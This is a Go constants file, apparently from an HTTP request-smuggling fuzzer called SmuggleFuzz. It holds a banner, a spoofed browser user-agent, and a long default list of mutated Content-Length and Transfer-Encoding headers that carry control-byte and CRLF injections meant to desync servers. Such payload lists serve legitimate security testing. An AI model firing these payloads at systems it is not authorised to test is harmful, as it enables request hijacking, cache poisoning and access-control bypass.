package lib

const (
	UserAgentHeaderValue = "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"

	Banner = `      
 _____                   _     _____             
|   __|_____ _ _ ___ ___| |___|   __|_ _ ___ ___ 
|__   |     | | | . | . | | -_|   __| | |- _|- _|
|_____|_|_|_|___|_  |_  |_|___|__|  |___|___|___|
                |___|___|  Moopinger v0.1.8

`

	// default gadgetList
	DefaultGadgetList = `validheader; smugglefuzz
CONTENT-LENGTH; 13
TRANSFER-ENCODING; CHUNKED
content-length; 13
transfer-encoding; chunked
transfer_encoding; chunked
content_length; 13
contentlength; 13
transferencoding; chunked
Content-Length; 13
content-length; "13"
content-length; '13'
content-length; +13
content-length; -13
Content-Length; "13"
Content-Length; '13'
Content-Length; +13
Content-Length; -13
content-length; cow13
Content-Length; cow13
Transfer-Encoding; chunked
Transfer-Encoding; chunked, identity
Transfer-Encoding; chunked,
Transfer-Encoding; , chunked
Transfer-Encoding; identity, chunked
Transfer-Encoding; Chunked
transfer-encoding; chunked
transfer-encoding; chunked, identity
transfer-encoding; chunked,
transfer-encoding; , chunked
transfer-encoding; identity, chunked
transfer-encoding; Chunked
Transfer-Encoding; chunked\r\nxxx: yyy
Transfer-Encoding; chunked\nxxx: yyy
transfer-encoding; chunked\r\nxxx: yyy
content-length; 13\r\nxxx: yyy
content-length; 13\nxxx: yyy
content-length: 13\r\nxxx; yyy
content-length: 13\nxxx; yyy
transfer-encoding; "chunked"
transfer-encoding; 'chunked'
transfer-encoding: chunked\r\n; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked; \r\nxxx: yyy
transfer-encoding: chunked; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked\n; xxx: yyy
transfer-encoding: chunked; \nxxx: yyy
XXXX; YYY\r\ncontent-length: 13
XXXX; YYY\r\ntransfer-encoding: chunked
XXXX; YYY\ntransfer-encoding: chunked
XXXX; YYYY\nYYYY\ncontent-length: 13
transfer; encoding: chunked
XXXX; transfer-encoding: chunked
content-length: 13; \r\nxxx: 13
content-length: 13; \nxxxX: 13
content-length:; 13
%20; content-length: 13
ddd: rrrrr\r\n; content-length: 13
content-length%01; 13
transfer-encoding%01; chunked
%01content-length; 13
%01transfer-encoding; chunked
content-length; %0113
transfer-encoding; chunked%01
content-length%04; 13
transfer-encoding%04; chunked
%04content-length; 13
%04transfer-encoding; chunked
content-length; %0413
transfer-encoding; chunked%04
content-length%08; 13
transfer-encoding%08; chunked
%08content-length; 13
%08transfer-encoding; chunked
content-length; %0813
transfer-encoding; chunked%08
content-length%09; 13
transfer-encoding%09; chunked
%09content-length; 13
%09transfer-encoding; chunked
content-length; %0913
transfer-encoding; chunked%09
content-length%0a; 13
transfer-encoding%0a; chunked
%0acontent-length; 13
%0atransfer-encoding; chunked
content-length; %0a13
transfer-encoding; chunked%0a
content-length%0b; 13
transfer-encoding%0b; chunked
%0bcontent-length; 13
%0btransfer-encoding; chunked
content-length; %0b13
transfer-encoding; chunked%0b
content-length%0c; 13
transfer-encoding%0c; chunked
%0ccontent-length; 13
%0ctransfer-encoding; chunked
content-length; %0c13
transfer-encoding; chunked%0c
content-length%0d; 13
transfer-encoding%0d; chunked
%0dcontent-length; 13
%0dtransfer-encoding; chunked
content-length; %0d13
transfer-encoding; chunked%0d
content-length%1f; 13
transfer-encoding%1f; chunked
%1fcontent-length; 13
%1ftransfer-encoding; chunked
content-length; %1f13
transfer-encoding; chunked%1f
content-length%20; 13
transfer-encoding%20; chunked
%20content-length; 13
%20transfer-encoding; chunked
content-length; %2013
transfer-encoding; chunked%20
content-length%7f; 13
transfer-encoding%7f; chunked
%7fcontent-length; 13
%7ftransfer-encoding; chunked
content-length; %7f13
transfer-encoding; chunked%7f
content-length%a0; 13
transfer-encoding%a0; chunked
%a0content-length; 13
%a0transfer-encoding; chunked
content-length; %a013
transfer-encoding; chunked%a0
content-length%ff; 13
transfer-encoding%ff; chunked
%ffcontent-length; 13
%fftransfer-encoding; chunked
content-length; %ff13
transfer-encoding; chunked%ff
:authority; [HOSTNAME]\r\n\r\n99\r\n
:scheme; https\r\n\r\n99\r\n`
)
